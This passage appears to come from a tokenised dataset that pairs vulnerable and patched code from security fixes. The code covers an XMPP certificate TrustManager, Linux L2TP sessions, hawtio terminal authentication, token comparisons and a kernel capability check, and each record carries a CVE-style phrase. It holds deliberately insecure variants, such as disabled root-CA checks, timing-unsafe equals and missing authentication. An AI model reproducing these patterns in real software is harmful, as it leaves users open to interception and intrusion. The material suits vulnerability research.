");", "}", "catch", "(", "IOException", "ioe", ")", "{", "/", "/", "Ignore", ".", "}", "}", "}", "stores", ".", "put", "(", "options", ",", "trustStore", ")", ";", "}", "if", "(", "trustStore", "=", "=", "null", ")", "/", "/", "Disable", "root", "CA", "checking", "configuration", ".", "setVerifyRootCAEnabled", "(", "false", ")", ";", "}", "}", "public", "X509Certificate", "[", "]", "getAcceptedIssuers", "(", ")", "{", "return", "new", "X509Certificate", "[", "0", "]", ";", "}", "public", "void", "checkClientTrusted", "(", "X509Certificate", "[", "]", "arg0", ",", "String", "arg1", ")", "throws", "CertificateException", "{", "}", "public", "void", "checkServerTrusted", "(", "X509Certificate", "[", "]", "x509Certificates", ",", "String", "arg1", ")", "throws", "CertificateException", "{", "int", "nSize", "=", "x509Certificates", ".", "length", ";", "List", "<", "String", ">", "peerIdentities", "=", "getPeerIdentity", "(", "x509Certificates", "[", "0", "]", ");", "if", "(", "configuration", ".", "isVerifyChainEnabled", "(", "))", "{", "/", "/", "Working", "down", "the", "chain", ",", "for", "every", "certificate", "in", "the", "chain", ",", "/", "/", "verify", "that", "the", "subject", "of", "the", "certificate", "is", "the", "issuer", "of", "the", "/", "/", "next", "certificate", "in", "the", "chain", ".", "Principal", "principalLast", "=", "null", ";", "for", "(", "int", "i", "=", "nSize", "-", "1", ";", "i", ">", "=", "0", ";", "i", "-", "-)", "{", "X509Certificate", "x509certificate", "=", "x509Certificates", "[", "i", "]", ";", "Principal", "principalIssuer", "=", "x509certificate", ".", "getIssuerDN", "(", ");", "Principal", "principalSubject", "=", "x509certificate", ".", "getSubjectDN", "(", ");", "if", "(", "principalLast", "!", "=", "null", ")", "{", "if", "(", "principalIssuer", ".", "equals", "(", "principalLast", ")", ")", "{", "try", "{", "PublicKey", "publickey", "=", "x509Certificates", "[", "i", "+", "1", "]", ".", "getPublicKey", "(", ");", "x509Certificates", "[", "i", "]", ".", "verify", "(", "publickey", ")", ";", "}", "catch", "(", "GeneralSecurityException", "generalsecurityexception", ")", "{", "throw", "new", "CertificateException", "(", "\"", "signature", "verification", "failed", "of", "\"", "+", "peerIdentities", ")", ";", "}", "}", "else", "{", "throw", "new", "CertificateException", "(", "\"", "subject", "/", "issuer", "verification", "failed", "of", "\"", "+", "peerIdentities", ")", ";", "}", "}", "principalLast", "=", "principalSubject", ";", "}", "}", "if", "(", "configuration", ".", "isVerifyRootCAEnabled", "(", "))", "{", "/", "/", "Verify", "that", "the", "the", "last", "certificate", "in", "the", "chain", "was", "issued", "/", "/", "by", "a", "third", "-", "party", "that", "the", "client", "trusts", ".", "boolean", "trusted", "=", "false", ";", "try", "{", "trusted", "=", "trustStore", ".", "getCertificateAlias", "(", "x509Certificates", "[", "nSize", "-", "1", "]", ")", "!", "=", "null", ";", "if", "(", "!", "trusted", "&", "&", "nSize", "=", "=", "1", "&", "&", "configuration", ".", "isSelfSignedCertificateEnabled", "(", "))", "{", "log", ".", "info", "(", "\"", "Accepting", "self", "-", "signed", "certificate", "of", "remote", "server", ":", "\"", "+", "peerIdentities", ")", ";", "trusted", "=", "true", ";", "}", "}", "catch", "(", "KeyStoreException", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "}", "if", "(", "!", "trusted", ")", "{", "throw", "new", "CertificateException", "(", "\"", "root", "certificate", "not", "trusted", "of", "\"", "+", "peerIdentities", ")", ";", "}", "}", "if", "(", "configuration", ".", "isNotMatchingDomainCheckEnabled", "(", "))", "{", "/", "/", "Verify", "that", "the", "first", "certificate", "in", "the", "chain", "corresponds", "to", "/", "/", "the", "server", "we", "desire", "to", "authenticate", ".", "/", "/", "Check", "if", "the", "certificate", "uses", "a", "wildcard", "indicating", "that", "subdomains", "are", "valid", "if", "(", "peerIdentities", ".", "size", "(", ")", "=", "=", "1", "&", "&", "peerIdentities", ".", "get", "(", "0", ")", ".", "startsWith", "(", "\"*", ".\"", "))", "{", "/", "/", "Remove", "the", "wildcard", "String", "peerIdentity", "=", "peerIdentities", ".", "get", "(", "0", ")", ".", "replace", "(", "\"*", ".\"", ",", "\"", "\")", ";", "/", "/", "Check", "if", "the", "requested", "subdomain", "matches", "the", "certified", "domain", "if", "(", "!", "server", ".", "endsWith", "(", "peerIdentity", ")", ")", "{", "throw", "new", "CertificateException", "(", "\"", "target", "verification", "failed", "of", "\"", "+", "peerIdentities", ")", ";", "}", "}", "else", "if", "(", "!", "peerIdentities", ".", "contains", "(", "server", ")", ")", "{", "throw", "new", "CertificateException", "(", "\"", "target", "verification", "failed", "of", "\"", "+", "peerIdentities", ")", ";", "}", "}", "if", "(", "configuration", ".", "isExpiredCertificatesCheckEnabled", "(", "))", "{", "/", "/", "For", "every", "certificate", "in", "the", "chain", ",", "verify", "that", "the", "certificate", "/", "/", "is", "valid", "at", "the", "current", "time", ".", "Date", "date", "=", "new", "Date", "(", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "nSize", ";", "i", "+", "+)", "{", "try", "{", "x509Certificates", "[", "i", "]", ".", "checkValidity", "(", "date", ")", ";", "}", "catch", "(", "GeneralSecurityException", "generalsecurityexception", ")", "{", "throw", "new", "CertificateException", "(", "\"", "invalid", "date", "of", "\"", "+", "server", ")", ";", "}", "}", "}", "}", "/", "**", "*", "Returns", "the", "identity", "of", "the", "remote", "server", "as", "defined", "in", "the", "specified", "certificate", ".", "The", "*", "identity", "is", "defined", "in", "the", "subjectDN", "of", "the", "certificate", "and", "it", "can", "also", "be", "defined", "in", "*", "the", "subjectAltName", "extension", "of", "type", "\"", "xmpp", "\"", ".", "When", "the", "extension", "is", "being", "used", "then", "the", "*", "identity", "defined", "in", "the", "extension", "in", "going", "to", "be", "returned", ".", "Otherwise", ",", "the", "value", "stored", "in", "*", "the", "subjectDN", "is", "returned", ".", "*", "*", "@", "param", "x509Certificate", "the", "certificate", "the", "holds", "the", "identity", "of", "the", "remote", "server", ".", "*", "@", "return", "the", "identity", "of", "the", "remote", "server", "as", "defined", "in", "the", "specified", "certificate", ".", "*", "/", "public", "static", "List", "<", "String", ">", "getPeerIdentity", "(", "X509Certificate", "x509Certificate", ")", "{", "/", "/", "Look", "the", "identity", "in", "the", "subjectAltName", "extension", "if", "available", "List", "<", "String", ">", "names", "=", "getSubjectAlternativeNames", "(", "x509Certificate", ")", ";", "if", "(", "names", ".", "isEmpty", "(", "))", "{", "String", "name", "=", "x509Certificate", ".", "getSubjectDN", "(", ").", "getName", "(", ");", "Matcher", "matcher", "=", "cnPattern", ".", "matcher", "(", "name", ")", ";", "if", "(", "matcher", ".", "find", "(", "))", "{", "name", "=", "matcher", ".", "group", "(", "2", ")", ";", "}", "/", "/", "Create", "an", "array", "with", "the", "unique", "identity", "names", "=", "new", "ArrayList", "<", "String", ">", "()", ";", "names", ".", "add", "(", "name", ")", ";", "}", "return", "names", ";", "}", "/", "**", "*", "Returns", "the", "JID", "representation", "of", "an", "XMPP", "entity", "contained", "as", "a", "SubjectAltName", "extension", "*", "in", "the", "certificate", ".", "If", "none", "was", "found", "then", "return", "<", "tt", ">", "null", "<", "/", "tt", ">", ".", "*", "*", "@", "param", "certificate", "the", "certificate", "presented", "by", "the", "remote", "entity", ".", "*", "@", "return", "the", "JID", "representation", "of", "an", "XMPP", "entity", "contained", "as", "a", "SubjectAltName", "extension", "*", "in", "the", "certificate", ".", "If", "none", "was", "found", "then", "return", "<", "tt", ">", "null", "<", "/", "tt", ">", ".", "*", "/", "private", "static", "List", "<", "String", ">", "getSubjectAlternativeNames", "(", "X509Certificate", "certificate", ")", "{", "List", "<", "String", ">", "identities", "=", "new", "ArrayList", "<", "String", ">", "()", ";", "try", "{", "Collection", "<", "List", "<", "?>", ">", "altNames", "=", "certificate", ".", "getSubjectAlternativeNames", "(", ");", "/", "/", "Check", "that", "the", "certificate", "includes", "the", "SubjectAltName", "extension", "if", "(", "altNames", "=", "=", "null", ")", "{", "return", "Collections", ".", "emptyList", "(", ");", "}", "/", "/", "Use", "the", "type", "OtherName", "to", "search", "for", "the", "certified", "server", "name", "/", "*", "for", "(", "List", "item", ":", "altNames", ")", "{", "Integer", "type", "=", "(", "Integer", ")", "item", ".", "get", "(", "0", ")", ";", "if", "(", "type", "=", "=", "0", ")", "{", "/", "/", "Type", "OtherName", "found", "so", "return", "the", "associated", "value", "try", "{", "/", "/", "Value", "is", "encoded", "using", "ASN", ".", "1", "so", "decode", "it", "to", "get", "the", "server", "'", "s", "identity", "ASN1InputStream", "decoder", "=", "new", "ASN1InputStream", "(", "(", "byte", "[", "])", "item", ".", "toArray", "(", ")[", "1", "]", ");", "DEREncodable", "encoded", "=", "decoder", ".", "readObject", "(", ");", "encoded", "=", "(", "(", "DERSequence", ")", "encoded", ")", ".", "getObjectAt", "(", "1", ")", ";", "encoded", "=", "(", "(", "DERTaggedObject", ")", "encoded", ")", ".", "getObject", "(", ");", "encoded", "=", "(", "(", "DERTaggedObject", ")", "encoded", ")", ".", "getObject", "(", ");", "String", "identity", "=", "(", "(", "DERUTF8String", ")", "encoded", ")", ".", "getString", "(", ");", "/", "/", "Add", "the", "decoded", "server", "name", "to", "the", "list", "of", "identities", "identities", ".", "add", "(", "identity", ")", ";", "}", "catch", "(", "UnsupportedEncodingException", "e", ")", "{", "/", "/", "Ignore", "}", "catch", "(", "IOException", "e", ")", "{", "/", "/", "Ignore", "}", "catch", "(", "Exception", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "}", "}", "/", "/", "Other", "types", "are", "not", "good", "for", "XMPP", "so", "ignore", "them", "log", ".", "info", "(", "\"", "SubjectAltName", "of", "invalid", "type", "found", ":", "\"", "+", "certificate", ")", ";", "}", "*/", "}", "catch", "(", "CertificateParsingException", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "}", "return", "identities", ";", "}", "private", "static", "class", "KeyStoreOptions", "{", "private", "final", "String", "type", ";", "private", "final", "String", "path", ";", "private", "final", "String", "password", ";", "public", "KeyStoreOptions", "(", "String", "type", ",", "String", "path", ",", "String", "password", ")", "{", "super", "(", ");", "this", ".", "type", "=", "type", ";", "this", ".", "path", "=", "path", ";", "this", ".", "password", "=", "password", ";", "}", "public", "String", "getType", "(", ")", "{", "return", "type", ";", "}", "public", "String", "getPath", "(", ")", "{", "return", "path", ";", "}", "public", "String", "getPassword", "(", ")", "{", "return", "password", ";", "}", "@", "Override", "public", "int", "hashCode", "(", ")", "{", "final", "int", "prime", "=", "31", ";", "int", "result", "=", "1", ";", "result", "=", "prime", "*", "result", "+", "(", "(", "password", "=", "=", "null", ")", "?", "0", ":", "password", ".", "hashCode", "(", "))", ";", "result", "=", "prime", "*", "result", "+", "(", "(", "path", "=", "=", "null", ")", "?", "0", ":", "path", ".", "hashCode", "(", "))", ";", "result", "=", "prime", "*", "result", "+", "(", "(", "type", "=", "=", "null", ")", "?", "0", ":", "type", ".", "hashCode", "(", "))", ";", "return", "result", ";", "}", "@", "Override", "public", "boolean", "equals", "(", "Object", "obj", ")", "{", "if", "(", "this", "=", "=", "obj", ")", "return", "true", ";", "if", "(", "obj", "=", "=", "null", ")", "return", "false", ";", "if", "(", "getClass", "(", ")", "!", "=", "obj", ".", "getClass", "(", "))", "return", "false", ";", "KeyStoreOptions", "other", "=", "(", "KeyStoreOptions", ")", "obj", ";", "if", "(", "password", "=", "=", "null", ")", "{", "if", "(", "other", ".", "password", "!", "=", "null", ")", "return", "false", ";", "}", "else", "if", "(", "!", "password", ".", "equals", "(", "other", ".", "password", ")", ")", "return", "false", ";", "if", "(", "path", "=", "=", "null", ")", "{", "if", "(", "other", ".", "path", "!", "=", "null", ")", "return", "false", ";", "}", "else", "if", "(", "!", "path", ".", "equals", "(", "other", ".", "path", ")", ")", "return", "false", ";", "if", "(", "type", "=", "=", "null", ")", "{", "if", "(", "other", ".", "type", "!", "=", "null", ")", "return", "false", ";", "}", "else", "if", "(", "!", "type", ".", "equals", "(", "other", ".", "type", ")", ")", "return", "false", ";", "return", "true", ";", "}", "}", "}", "@", "@", "-", "844", ",", "8", "+", "844", ",", "7", "@", "@", "else", "if", "(", "config", ".", "getKeystoreType", "(", ").", "equals", "(", "\"", "Apple", "\"", "))", "{", "context", ".", "init", "(", "kms", ",", "new", "javax", ".", "net", ".", "ssl", ".", "TrustManager", "[", "]", "{", "new", "ServerTrustManager", "(", "getServiceName", "(", "),", "config", ")", "}", ",", "new", "java", ".", "security", ".", "SecureRandom", "(", "))", ";"], "docstring_tokens": ["using", "man-in-the-middle", "techniques"]}
{"contents": ["empty"], "code_tokens": ["int", "(", "*", "session_create", ")", "(", "struct", "net", "*", "net", ",", "struct", "l2tp_tunnel", "*", "tunnel", ",", "u32", "session_id", ",", "u32", "peer_session_id", ",", "struct", "l2tp_session_cfg", "*", "cfg", ")", ";", "static", "int", "l2tp_eth_create", "(", "struct", "net", "*", "net", ",", "struct", "l2tp_tunnel", "*", "tunnel", ",", "u32", "session_id", ",", "u32", "peer_session_id", ",", "struct", "l2tp_session_cfg", "*", "cfg", ")", "ret", "=", "l2tp_nl_cmd_ops", "[", "cfg", ".", "pw_type", "]", "->", "session_create", "(", "net", ",", "tunnel", ",", "session_id", ",", "peer_session_id", ",", "&", "cfg", ")", ";", "/", "*", "Called", "when", "creating", "sessions", "via", "the", "netlink", "interface", ".", "*", "/", "static", "int", "pppol2tp_session_create", "(", "struct", "net", "*", "net", ",", "struct", "l2tp_tunnel", "*", "tunnel", ",", "u32", "session_id", ",", "u32", "peer_session_id", ",", "struct", "l2tp_session_cfg", "*", "cfg", ")", "if", "(", "!", "tunnel", "-", ">", "sock", ")", "{", "error", "=", "-", "ENOENT", ";", "}</s>int", "(", "*", "session_create", ")", "(", "struct", "net", "*", "net", ",", "u32", "tunnel_id", ",", "u32", "session_id", ",", "u32", "peer_session_id", ",", "struct", "l2tp_session_cfg", "*", "cfg", ")", ";", "static", "int", "l2tp_eth_create", "(", "struct", "net", "*", "net", ",", "u32", "tunnel_id", ",", "u32", "session_id", ",", "u32", "peer_session_id", ",", "struct", "l2tp_session_cfg", "*", "cfg", ")", "struct", "l2tp_tunnel", "*", "tunnel", ";", "tunnel", "=", "l2tp_tunnel_find", "(", "net", ",", "tunnel_id", ")", ";", "if", "(", "!", "tunnel", ")", "{", "rc", "=", "-", "ENODEV", ";", "goto", "out", ";", "}", "ret", "=", "-", "EPROTONOSUPPORT", ";", "if", "(", "l2tp_nl_cmd_ops", "[", "cfg", ".", "pw_type", "]", "->", "session_create", ")", "ret", "=", "(", "*", "l2tp_nl_cmd_ops", "[", "cfg", ".", "pw_type", "]", "->", "session_create", ")", "(", "net", ",", "tunnel_id", ",", "session_id", ",", "peer_session_id", ",", "&", "cfg", ")", ";", "/", "*", "Called", "when", "creating", "sessions", "via", "the", "netlink", "interface", ".", "*", "/", "static", "int", "pppol2tp_session_create", "(", "struct", "net", "*", "net", ",", "u32", "tunnel_id", ",", "u32", "session_id", ",", "u32", "peer_session_id", ",", "struct", "l2tp_session_cfg", "*", "cfg", ")", "struct", "l2tp_tunnel", "*", "tunnel", ";", "tunnel", "=", "l2tp_tunnel_find", "(", "net", ",", "tunnel_id", ")", ";", "/", "*", "Error", "if", "we", "can", "'", "t", "find", "the", "tunnel", "*", "/", "error", "=", "-", "ENOENT", ";", "if", "(", "tunnel", "=", "=", "NULL", ")", "goto", "out", ";", "if", "(", "tunnel", "-", ">", "sock", "=", "=", "NULL", ")"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["package", "io", ".", "hawt", ".", "web", ".", "plugin", ".", "karaf", ".", "terminal", ";", "import", "io", ".", "hawt", ".", "system", ".", "ConfigManager", ";", "import", "javax", ".", "servlet", ".", "ServletContextEvent", ";", "import", "javax", ".", "servlet", ".", "ServletContextListener", ";", "/", "**", "*", "@", "author", "Stan", "Lewis", "*", "/", "public", "class", "KarafTerminalContextListener", "implements", "ServletContextListener", "{", "private", "ConfigManager", "configManager", "=", "new", "ConfigManager", "(", ");", "@", "Override", "public", "void", "contextInitialized", "(", "ServletContextEvent", "sce", ")", "{", "try", "{", "configManager", ".", "init", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "createServletException", "(", "e", ")", ";", "}", "sce", ".", "getServletContext", "(", ").", "setAttribute", "(", "\"", "ConfigManager", "\"", ",", "configManager", ")", ";", "}", "@", "Override", "public", "void", "contextDestroyed", "(", "ServletContextEvent", "sce", ")", "{", "try", "{", "configManager", ".", "destroy", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "createServletException", "(", "e", ")", ";", "}", "}", "protected", "RuntimeException", "createServletException", "(", "Exception", "e", ")", "{", "return", "new", "RuntimeException", "(", "e", ")", ";", "}", "}", "@", "@", "-", "1", ",", "18", "+", "1", ",", "23", "@", "@", "import", "io", ".", "hawt", ".", "system", ".", "Helpers", ";", "import", "javax", ".", "security", ".", "auth", ".", "Subject", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpSession", ";", "import", "java", ".", "security", ".", "AccessControlContext", ";", "import", "java", ".", "security", ".", "AccessController", ";", "HttpSession", "session", "=", "request", ".", "getSession", "(", "false", ")", ";", "if", "(", "session", "=", "=", "null", ")", "{", "AccessControlContext", "acc", "=", "AccessController", ".", "getContext", "(", ");", "Subject", "subject", "=", "Subject", ".", "getSubject", "(", "acc", ")", ";", "if", "(", "subject", "=", "=", "null", ")", "{", "Helpers", ".", "doForbidden", "(", "response", ")", ";", "return", ";", "}", "session", "=", "request", ".", "getSession", "(", "true", ")", ";", "session", ".", "setAttribute", "(", "\"", "subject", "\"", ",", "subject", ")", ";", "}", "else", "{", "Subject", "subject", "=", "(", "Subject", ")", "session", ".", "getAttribute", "(", "\"", "subject", "\"", ");", "if", "(", "subject", "=", "=", "null", ")", "{", "session", ".", "invalidate", "(", ");", "Helpers", ".", "doForbidden", "(", "response", ")", ";", "return", ";", "}", "}", "SessionTerminal", "st", "=", "(", "SessionTerminal", ")", "session", ".", "getAttribute", "(", "\"", "terminal", "\"", ");", "session", ".", "setAttribute", "(", "\"", "terminal", "\"", ",", "st", ")", ";", "boolean", "doAuthenticate", "=", "true", ";", "LOG", ".", "warn", "(", "\"", "No", "authentication", "needed", "for", "path", "{", "}\"", ",", "path", ")", ";</s>SessionTerminal", "st", "=", "(", "SessionTerminal", ")", "request", ".", "getSession", "(", "true", ")", ".", "getAttribute", "(", "\"", "terminal", "\"", ");", "request", ".", "getSession", "(", ").", "setAttribute", "(", "\"", "terminal", "\"", ",", "st", ")", ";", "boolean", "doAuthenticate", "=", "path", ".", "startsWith", "(", "\"/", "auth", "\"", ")", "|", "|", "path", ".", "startsWith", "(", "\"/", "jolokia", "\"", ")", "|", "|", "path", ".", "startsWith", "(", "\"/", "upload", "\"", ");", "LOG", ".", "debug", "(", "\"", "No", "authentication", "needed", "for", "path", "{", "}\"", ",", "path", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request", "with", "k", "parameter"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "security", ".", "MessageDigest", ";", "String", "token", "=", "getApiTokenInsecure", "(", ");", "return", "MessageDigest", ".", "isEqual", "(", "password", ".", "getBytes", "(", "),", "token", ".", "getBytes", "(", "))", ";</s>return", "getApiTokenInsecure", "(", ").", "equals", "(", "password", ")", ";"], "docstring_tokens": ["via", "a", "brute-force", "approach", "."]}
{"contents": ["empty"], "code_tokens": ["java", ".", "security", ".", "MessageDigest", ".", "isEqual", "(", "providedSignature", ".", "getBytes", "(", "),", "signature", ".", "getBytes", "(", "))</s>providedSignature", ".", "contentEquals", "(", "signature", ")"], "docstring_tokens": ["by", "repeating", "validation", "requests", "."]}
{"contents": ["empty"], "code_tokens": ["#", "include", "<", "linux", "/", "pid_namespace", ".", "h", ">", "if", "(", "(", "creds", "-", ">", "pid", "=", "=", "task_tgid_vnr", "(", "current", ")", "|", "|", "ns_capable", "(", "current", "-", ">", "nsproxy", "-", ">", "pid_ns", "-", ">", "user_ns", ",", "CAP_SYS_ADMIN", ")", ")", "&", "&</s>if", "(", "(", "creds", "-", ">", "pid", "=", "=", "task_tgid_vnr", "(", "current", ")", "|", "|", "nsown_capable", "(", "CAP_SYS_ADMIN", ")", ")", "&", "&"], "docstring_tokens": ["by", "leveraging", "the", "time", "interval", "during", "which", "a", "user", "namespace", "has", "been", "created"]}
{"contents": ["empty"], "code_tokens": ["than", "an", "occasional", "beep", ",", "say", "Y", ".", "obj", "-", "$(", "CONFIG_DMASOUND", ")", "+", "=", "oss", "/", "dmasound", "/</s>ALS", "-", "007", "/", "ALS", "-", "100", "/", "ALS", "-", "200", "based", "sound", "cards", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "Support", "for", "sound", "cards", "based", "around", "the", "Avance", "Logic", "ALS", "-", "007", "/", "ALS", "-", "100", "/", "ALS", "-", "200", "chip", "is", "included", ".", "These", "chips", "are", "a", "single", "chip", "PnP", "sound", "solution", "which", "is", "mostly", "hardware", "compatible", "with", "the", "Sound", "Blaster", "16", "card", ",", "with", "most", "differences", "occurring", "in", "the", "use", "of", "the", "mixer", "registers", ".", "For", "this", "reason", "the", "ALS", "code", "is", "integrated", "as", "part", "of", "the", "Sound", "Blaster", "16", "driver", "(", "adding", "only", "800", "bytes", "to", "the", "SB16", "driver", ")", ".", "To", "use", "an", "ALS", "sound", "card", "under", "Linux", ",", "enable", "the", "following", "options", "as", "modules", "in", "the", "sound", "configuration", "section", "of", "the", "kernel", "config", ":", "-", "100", "%", "Sound", "Blaster", "compatibles", "(", "SB16", "/", "32", "/", "64", ",", "ESS", ",", "Jazz16", ")", "support", "-", "FM", "synthesizer", "(", "YM3812", "/", "OPL", "-", "3", ")", "support", "-", "standalone", "MPU401", "support", "may", "be", "required", "for", "some", "cards", ";", "for", "the", "ALS", "-", "007", ",", "when", "using", "isapnptools", ",", "it", "is", "required", "Since", "the", "ALS", "-", "007", "/", "100", "/", "200", "are", "PnP", "cards", ",", "ISAPnP", "support", "should", "probably", "be", "compiled", "in", ".", "If", "kernel", "level", "PnP", "support", "is", "not", "included", ",", "isapnptools", "will", "be", "required", "to", "configure", "the", "card", "before", "the", "sound", "modules", "are", "loaded", ".", "When", "using", "kernel", "level", "ISAPnP", ",", "the", "kernel", "should", "correctly", "identify", "and", "configure", "all", "resources", "required", "by", "the", "card", "when", "the", "\"", "sb", "\"", "module", "is", "inserted", ".", "Note", "that", "the", "ALS", "-", "007", "does", "not", "have", "a", "16", "bit", "DMA", "channel", "and", "that", "the", "MPU401", "interface", "on", "this", "card", "uses", "a", "different", "interrupt", "to", "the", "audio", "section", ".", "This", "should", "all", "be", "correctly", "configured", "by", "the", "kernel", ";", "if", "problems", "with", "the", "MPU401", "interface", "surface", ",", "try", "using", "the", "standalone", "MPU401", "module", ",", "passing", "\"", "0", "\"", "as", "the", "\"", "sb", "\"", "module", "'", "s", "\"", "mpu_io", "\"", "module", "parameter", "to", "prevent", "the", "soundblaster", "driver", "attempting", "to", "register", "the", "MPU401", "itself", ".", "The", "onboard", "synth", "device", "can", "be", "accessed", "using", "the", "\"", "opl3", "\"", "module", ".", "If", "isapnptools", "is", "used", "to", "wake", "up", "the", "sound", "card", "(", "as", "in", "2", ".", "2", ".", "x", ")", ",", "the", "settings", "of", "the", "card", "'", "s", "resources", "should", "be", "passed", "to", "the", "kernel", "modules", "(", "\"", "sb", "\"", ",", "\"", "opl3", "\"", "and", "\"", "mpu401", "\"", ")", "using", "the", "module", "parameters", ".", "When", "configuring", "an", "ALS", "-", "007", ",", "be", "sure", "to", "specify", "different", "IRQs", "for", "the", "audio", "and", "MPU401", "sections", "-", "this", "card", "requires", "they", "be", "different", ".", "For", "\"", "sb", "\"", ",", "\"", "io", "\"", ",", "\"", "irq", "\"", "and", "\"", "dma", "\"", "should", "be", "set", "to", "the", "same", "values", "used", "to", "configure", "the", "audio", "section", "of", "the", "card", "with", "isapnp", ".", "\"", "dma16", "\"", "should", "be", "explicitly", "set", "to", "\"", "-", "1", "\"", "for", "an", "ALS", "-", "007", "since", "this", "card", "does", "not", "have", "a", "16", "bit", "dma", "channel", ";", "if", "not", "specified", "the", "kernel", "will", "default", "to", "using", "channel", "5", "anyway", "which", "will", "cause", "audio", "not", "to", "work", ".", "\"", "mpu_io", "\"", "should", "be", "set", "to", "0", ".", "The", "\"", "io", "\"", "parameter", "of", "the", "\"", "opl3", "\"", "module", "should", "also", "agree", "with", "the", "setting", "used", "by", "isapnp", ".", "To", "get", "the", "MPU401", "interface", "working", "on", "an", "ALS", "-", "007", "card", ",", "the", "\"", "mpu401", "\"", "module", "will", "be", "required", "since", "this", "card", "uses", "separate", "IRQs", "for", "the", "audio", "and", "MPU401", "sections", "and", "there", "is", "no", "parameter", "available", "to", "pass", "a", "different", "IRQ", "to", "the", "\"", "sb", "\"", "driver", "(", "whose", "inbuilt", "MPU401", "driver", "would", "otherwise", "be", "fine", ")", ".", "Insert", "the", "mpu401", "module", "passing", "appropriate", "values", "using", "the", "\"", "io", "\"", "and", "\"", "irq", "\"", "parameters", ".", "The", "resulting", "sound", "driver", "will", "provide", "the", "following", "capabilities", ":", "-", "8", "and", "16", "bit", "audio", "playback", "-", "8", "and", "16", "bit", "audio", "recording", "-", "Software", "selection", "of", "record", "source", "(", "line", "in", ",", "CD", ",", "FM", ",", "mic", ",", "master", ")", "-", "Record", "and", "playback", "of", "midi", "data", "via", "the", "external", "MPU", "-", "401", "-", "Playback", "of", "midi", "data", "using", "inbuilt", "FM", "synthesizer", "-", "Control", "of", "the", "ALS", "-", "007", "mixer", "via", "any", "OSS", "-", "compatible", "mixer", "programs", ".", "Controls", "available", "are", "Master", "(", "L", "&", "R", ")", ",", "Line", "in", "(", "L", "&", "R", ")", ",", "CD", "(", "L", "&", "R", ")", ",", "DSP", "/", "PCM", "/", "audio", "out", "(", "L", "&", "R", ")", ",", "FM", "(", "L", "&", "R", ")", "and", "Mic", "in", "(", "mono", ")", ".", "Jonathan", "Woithe", "jwoithe", "@", "just42", ".", "net", "30", "March", "1998", "Modified", "2000", "-", "02", "-", "26", "by", "Dave", "Forrest", ",", "drf5n", "@", "virginia", ".", "edu", "to", "add", "ALS100", "/", "ALS200", "Modified", "2000", "-", "04", "-", "10", "by", "Paul", "Laufer", ",", "pelaufer", "@", "csupomona", ".", "edu", "to", "add", "ISAPnP", "info", ".", "Modified", "2000", "-", "11", "-", "19", "by", "Jonathan", "Woithe", ",", "jwoithe", "@", "just42", ".", "net", "-", "updated", "information", "for", "kernel", "2", ".", "4", ".", "x", ".", "@", "@", "-", "1", ",", "101", "+", "0", ",", "0", "@", "@", "Driver", "Information", "about", "Audio", "Excel", "DSP", "16", "driver", "can", "be", "found", "in", "the", "source", "file", "aedsp16", ".", "c", "Please", ",", "read", "the", "head", "of", "the", "source", "before", "using", "it", ".", "It", "contain", "useful", "information", ".", "Configuration", "The", "Audio", "Excel", "configuration", ",", "is", "now", "done", "with", "the", "standard", "Linux", "setup", ".", "You", "have", "to", "configure", "the", "sound", "card", "(", "Sound", "Blaster", "or", "Microsoft", "Sound", "System", ")", "and", ",", "if", "you", "want", "it", ",", "the", "Roland", "MPU", "-", "401", "(", "do", "not", "use", "the", "Sound", "Blaster", "MPU", "-", "401", ",", "SB", "-", "MPU401", ")", "in", "the", "main", "driver", "menu", ".", "Activate", "the", "lowlevel", "drivers", "then", "select", "the", "Audio", "Excel", "hardware", "that", "you", "want", "to", "initialize", ".", "Check", "the", "IRQ", "/", "DMA", "/", "MIRQ", "of", "the", "Audio", "Excel", "initialization", ":", "it", "must", "be", "the", "same", "as", "the", "SBPRO", "(", "or", "MSS", ")", "setup", ".", "If", "the", "parameters", "are", "different", ",", "correct", "it", ".", "I", "you", "own", "a", "Gallant", "'", "s", "audio", "card", "based", "on", "SC", "-", "6600", ",", "activate", "the", "SC", "-", "6600", "support", ".", "If", "you", "want", "to", "change", "the", "configuration", "of", "the", "sound", "board", ",", "be", "sure", "to", "check", "off", "all", "the", "configuration", "items", "before", "re", "-", "configure", "it", ".", "Module", "parameters", "To", "use", "this", "driver", "as", "a", "module", ",", "you", "must", "configure", "some", "module", "parameters", ",", "to", "set", "up", "I", "/", "O", "addresses", ",", "IRQ", "lines", "and", "DMA", "channels", ".", "Some", "parameters", "are", "mandatory", "while", "some", "others", "are", "optional", ".", "Here", "a", "list", "of", "parameters", "you", "can", "use", "with", "this", "module", ":", "Name", "Description", "=", "==", "=", "=", "==", "==", "==", "==", "==", "MANDATORY", "io", "I", "/", "O", "base", "address", "(", "0x220", "or", "0x240", ")", "irq", "irq", "line", "(", "5", ",", "7", ",", "9", ",", "10", "or", "11", ")", "dma", "dma", "channel", "(", "0", ",", "1", "or", "3", ")", "OPTIONAL", "mss_base", "I", "/", "O", "base", "address", "for", "activate", "MSS", "mode", "(", "default", "SBPRO", ")", "(", "0x530", "or", "0xE80", ")", "mpu_base", "I", "/", "O", "base", "address", "for", "activate", "MPU", "-", "401", "mode", "(", "0x300", ",", "0x310", ",", "0x320", "or", "0x330", ")", "mpu_irq", "MPU", "-", "401", "irq", "line", "(", "5", ",", "7", ",", "9", ",", "10", "or", "0", ")", "A", "configuration", "file", "in", "/", "etc", "/", "modprobe", ".", "d", "/", "directory", "will", "have", "lines", "like", "this", ":", "options", "opl3", "io", "=", "0x388", "options", "ad1848", "io", "=", "0x530", "irq", "=", "11", "dma", "=", "3", "options", "aedsp16", "io", "=", "0x220", "irq", "=", "11", "dma", "=", "3", "mss_base", "=", "0x530", "Where", "the", "aedsp16", "options", "are", "the", "options", "for", "this", "driver", "while", "opl3", "and", "ad1848", "are", "the", "corresponding", "options", "for", "the", "MSS", "and", "OPL3", "modules", ".", "Loading", "MSS", "and", 